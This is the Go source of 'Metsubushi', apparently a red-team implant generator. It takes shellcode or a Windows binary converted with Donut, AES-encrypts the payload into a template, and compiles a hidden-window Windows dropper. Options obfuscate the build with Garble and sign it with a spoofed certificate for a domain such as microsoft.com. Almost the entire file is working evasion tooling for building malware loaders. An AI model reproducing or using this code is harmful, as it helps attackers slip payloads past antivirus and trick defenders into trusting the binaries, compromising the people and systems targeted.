/*
 * Metsubushi
 * by Red Skal
 *
 * Generates Go-based implants from a given template and shellcode.
 */

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"metsubushi/limelighter"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/Binject/go-donut/donut"
)

var bannerAscii string = `

███╗░░░███╗███████╗████████╗░██████╗██╗░░░██╗██████╗░██╗░░░██╗░██████╗██╗░░██╗██╗
████╗░████║██╔════╝╚══██╔══╝██╔════╝██║░░░██║██╔══██╗██║░░░██║██╔════╝██║░░██║██║
██╔████╔██║█████╗░░░░░██║░░░╚█████╗░██║░░░██║██████╦╝██║░░░██║╚█████╗░███████║██║
██║╚██╔╝██║██╔══╝░░░░░██║░░░░╚═══██╗██║░░░██║██╔══██╗██║░░░██║░╚═══██╗██╔══██║██║
██║░╚═╝░██║███████╗░░░██║░░░██████╔╝╚██████╔╝██████╦╝╚██████╔╝██████╔╝██║░░██║██║
╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═════╝░░╚═════╝░╚═════╝░░╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝
             
                      "Ninja...vanish!"
                              -- Master Tatsu

            by Red Skal

`

func banner() {

	fmt.Println(bannerAscii)

}

func padShellcode(shellcode []byte, length int) []byte {
	lenShell := len(shellcode)
	remainder := lenShell % length
	paddedLen := lenShell + (length - remainder)
	tmp := make([]byte, paddedLen)
	copy(tmp, shellcode)
	return tmp
}

func encryptShellcode(key, shellcode []byte) ([]byte, error) {
	shellcodeAdjusted := shellcode
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if remainder := len(shellcode) % aes.BlockSize; remainder != 0 {
		shellcodeAdjusted = padShellcode(shellcode, aes.BlockSize)
	}
	ciphertext := make([]byte, aes.BlockSize+len(shellcodeAdjusted)) // pad to block size by using remainder of shellcode modulus.
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], shellcodeAdjusted)

	return ciphertext, nil
}

// convert -d argument string to DonutConfig
// if string is empty return a basic config
func convertArgsToConfig(args string) (*donut.DonutConfig, error) {
	// assign basic default config for starters...
	config := new(donut.DonutConfig)
	config.Arch = donut.X64
	config.Entropy = uint32(3)
	config.OEP = uint64(0)
	config.InstType = donut.DONUT_INSTANCE_PIC
	config.Bypass = 3
	config.Compress = uint32(1)
	config.Format = uint32(1)
	config.ExitOpt = uint32(1)
	config.Thread = 1

	// parse the argument string
	var tmp []string
	var i int
	var err error
	for _, value := range strings.Split(args, ",") {
		tmp = strings.Split(value, "=")

		switch tmp[0] {
		case "n", "module":
			config.ModuleName = tmp[1]
		case "u", "url":
			config.URL = tmp[1]
			config.InstType = donut.DONUT_INSTANCE_URL
		case "e", "entropy":
			i, err = strconv.Atoi(tmp[1])
			if err != nil {
				return nil, err
			}
			config.Entropy = uint32(i)
		case "a", "arch":
			var donutArch donut.DonutArch
			switch strings.ToLower(tmp[1]) {
			case "x32", "386", "x86":
				donutArch = donut.X32
			case "x64", "amd64":
				donutArch = donut.X64
			case "x84":
				donutArch = donut.X84
			default:
				log.Fatal("Unknown architecture provided")
			}
			config.Arch = donutArch
		case "b", "bypass":
			config.Bypass, err = strconv.Atoi(tmp[1])
			if err != nil {
				return nil, err
			}
		case "f", "format":
			i, err = strconv.Atoi(tmp[1])
			if err != nil {
				return nil, err
			}
			config.Format = uint32(i)
		case "y", "oep":
			u, err := strconv.ParseUint(tmp[1], 16, 64)
			if err != nil {
				return nil, err
			}
			config.OEP = u
		case "x", "exit":
			i, err = strconv.Atoi(tmp[1])
			if err != nil {
				return nil, err
			}
			config.ExitOpt = uint32(i)
		case "c", "class":
			config.Class = tmp[1]
		case "d", "domain":
			config.Domain = tmp[1]
		case "m", "method":
			config.Method = tmp[1]
		case "p", "params":
			config.Parameters = tmp[1]
		case "w", "unicode":
			config.Unicode = 1
		case "r", "runtime":
			config.Runtime = tmp[1]
		case "t", "thread":
			config.Thread = 1
		case "z", "compress":
			i, err = strconv.Atoi(tmp[1])
			if err != nil {
				return nil, err
			}
			config.Compress = uint32(i)
		default:
		}
	}

	return config, nil
}

// TODO: Adjust function to utilise user-supplied arguments
// Mostly ripped from Go-Donut and adjusted for my own use.
func generateDonutShellcode(inFile, args string) ([]byte, error) {

	config, err := convertArgsToConfig(args)
	if err != nil {
		return nil, err
	}

	shellcode, err := donut.ShellcodeFromFile(inFile, config)

	return []byte(shellcode.String()), err
}

func generateHexVar(src []byte) []byte {

	result := make([]byte, 6*len(src))
	buff := bytes.NewBuffer(result)
	for _, b := range src {
		fmt.Fprintf(buff, "0x%02x, ", b)
	}
	return []byte(buff.String())
}

func compile(projectDirectory, projectName, arch string, useGarble bool) error {

	err := os.Chdir(projectDirectory)
	if err != nil {
		fmt.Println("[!] Error changing directory to compile Go project.")
	}

	// Initialise the project modules...
	fmt.Println("[+] Initialising modules for Go project...")
	cmd, err := exec.Command("go", "mod", "init", projectName).Output()
	if err != nil {
		fmt.Println("[!] Error initialising Go project modules.")
		return err
	} else {
		fmt.Printf(string(cmd))
	}

	// Pull and tidy modules for housekeeping
	fmt.Println("[+] Tidying Go modules...")
	cmd, err = exec.Command("go", "mod", "tidy").Output()
	if err != nil {
		fmt.Println("[!] Error tidying Go project modules")
		return err
	} else {
		fmt.Printf(string(cmd))
	}

	// locate absolute path to Go compiler or Garble obfuscator
	var goBinary string
	if !useGarble {
		goBinary, err = exec.LookPath("go")
		if err != nil {
			fmt.Println("[!] Unable to locate Go compiler. Be sure it's within your PATH.")
			return err
		}
	} else {
		goBinary, err = exec.LookPath("garble")
		if err != nil {
			fmt.Println("[!] Unable to locate Garble. Be sure it's within your PATH.")
			return err
		}
	}

	envBinary, err := exec.LookPath("env")
	if err != nil {
		fmt.Println("[!] Unable to locate env executable. System is b0rked?")
		return err
	}

	// arch is pre-sanitised so there should be no chance of error with this method.
	projectArch := "GOARCH=" + arch
	// the Go build flags are to hide the droppers window from the user. (Akin to using WinMain() in C)
	cmd, err = exec.Command(envBinary, "GOOS=windows", projectArch, goBinary, "build", "-ldflags=-s -w -H=windowsgui").Output()
	if err != nil {
		fmt.Println("[!] Error compiling Go file.")
		return err
	}

	fmt.Printf(string(cmd))
	return nil
}

// sign our implant using Limelighter library from Scarecrow by Tylous/Optiv
func signBinary(domain, inFile string) string {
	password := limelighter.VarNumberLength(8, 12)
	pfx := domain + ".pfx"
	limelighter.GenerateCert(domain, inFile)
	limelighter.GeneratePFK(password, domain)

	splitFileName := strings.Split(inFile, ".")
	absFile := strings.Join(splitFileName[:len(splitFileName)-1], "") + "_signed.exe"

	limelighter.SignExecutable(password, pfx, inFile, absFile)

	return absFile
}

func main() {

	var payloadFile, templateFile, outFile, arch, donutArgs, signImplant string
	var helpRequired, startQuiet, useGarble bool
	flag.StringVar(&payloadFile, "p", "", "Windows binary or raw shellcode file. (Use -d with Windows binaries to generate Donut shellcode).")
	flag.StringVar(&templateFile, "t", "basic.go", "Name of the template to use.")
	flag.StringVar(&outFile, "o", "not-a-backdoor.exe", "Filename of the generated implant binary.")
	flag.StringVar(&arch, "a", "x64", "Architecture to compile for. 'x64' or 'x86'.")
	flag.StringVar(&donutArgs, "d", "unused", "Use Donut to generate shellcode from a Windows binary.")
	flag.StringVar(&signImplant, "s", "", "Sign implant using Limelighter. Provide a domain. Eg. www.microsoft.com")
	flag.BoolVar(&helpRequired, "help", false, "This help menu.")
	flag.BoolVar(&startQuiet, "q", false, "Start without showing the secksual ASCII artwork.")
	flag.BoolVar(&useGarble, "g", false, "Use Garble to obfuscate the generated implant.")

	flag.Parse()

	// gratuitous ASCII art banner because I'm a walking cliché.
	if !startQuiet {
		banner()
	}

	// TODO: Create custom usage function which explains Donut flag syntax.
	if helpRequired {
		flag.Usage()
		return
	}

	if payloadFile == "" {
		flag.Usage()
		return
	}

	switch strings.ToLower(arch) {
	case "x86", "x32":
		arch = "386"
	case "x64", "x86-64":
		arch = "amd64"
	default:
		arch = "amd64"
		fmt.Println("[-] Bad architecture choice. Defaulted to 64-bit.")
	}
	fmt.Println("[+] Architecture selected:", arch)

	var payloadContent []byte
	var err error
	if donutArgs != "unused" {
		fmt.Println("[+] Generating Donut shellcode from:", payloadFile)
		payloadContent, err = generateDonutShellcode(payloadFile, donutArgs)
		if err != nil {
			fmt.Println("[!] Could not generate shellcode with Donut.")
			return
		}
	} else {
		fmt.Println("[+] Reading shellcode from:", payloadFile)
		payloadContent, err = ioutil.ReadFile(payloadFile)
		if err != nil {
			fmt.Println("[!] Could not read shellcode from file.")
			return
		}
	}

	executablePath, _ := os.Executable()
	workingDirectory, _ := filepath.Split(executablePath)

	workingTemplate := workingDirectory + "templates/" + templateFile

	fmt.Println("[+] Reading template file:", workingTemplate)
	templateContent, err := ioutil.ReadFile(workingTemplate)
	if err != nil {
		fmt.Println("[!] Error reading template file.")
		return
	}

	fmt.Println("[+] Generating random key for shellcode encryption...")
	key := make([]byte, 16)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		fmt.Println("[!] Unable to generate random key for shellcode encryption.")
		return
	}

	fmt.Println("[+] Encrypting shellcode...")
	encryptedShellcode, err := encryptShellcode(key, payloadContent)
	if err != nil {
		fmt.Println("[!] Unable to generate encrypted shellcode.")
		return
	}

	fmt.Printf("[+] Adding shellcode and key to template: %s\n", templateFile)
	// Have to use bytes.Trim() because something prepends null bytes when pasting into template string
	outputContent := bytes.Replace(templateContent, []byte("{{SHELLCODE}}"), bytes.Trim(generateHexVar(encryptedShellcode), "\x00"), 1)
	outputContent = bytes.Replace(outputContent, []byte("{{KEY}}"), bytes.Trim(generateHexVar(key), "\x00"), 1)

	splitFileName := strings.Split(outFile, ".")
	fileNameWithoutExt := strings.Join(splitFileName[:len(splitFileName)-1], "")

	outputDirectory := workingDirectory + "generated/" + fileNameWithoutExt
	_, err = exec.Command("mkdir", outputDirectory).Output()
	if err != nil {
		fmt.Printf("[!] Error creating directory: %s\n", outputDirectory)
		return
	}

	outputFile := outputDirectory + "/main.go"

	fmt.Printf("[+] Writing Go project file: %s\n", outputFile)
	err = ioutil.WriteFile(outputFile, outputContent, 0644)
	if err != nil {
		fmt.Println("[!] Error writing Go project file.")
		return
	}

	var compilerName string
	if useGarble {
		compilerName = "Garble obfuscator"
	} else {
		compilerName = "Go compiler"
	}
	fmt.Printf("[+] Using %s to build: %s\n", compilerName, outputFile)
	compile := compile(outputDirectory, fileNameWithoutExt, arch, useGarble)
	if compile != nil {
		fmt.Println("[!] Error compiling file")
		return
	}

	fmt.Println("[+] Compiled successfully")
	fmt.Println("[+] Implant generated at:", outputDirectory+"/"+outFile)

	if signImplant != "" {
		fmt.Println("[+] Attempting to create a signed implant using domain:", signImplant)
		signedFile := signBinary(signImplant, outputDirectory+"/"+outFile)
		fmt.Printf("[+] Signed binary should be located at:  %s\n", signedFile)
	}

	fmt.Println("[+] !! Test payload with redress and execute in lab environment before use on engagements. !!")
}
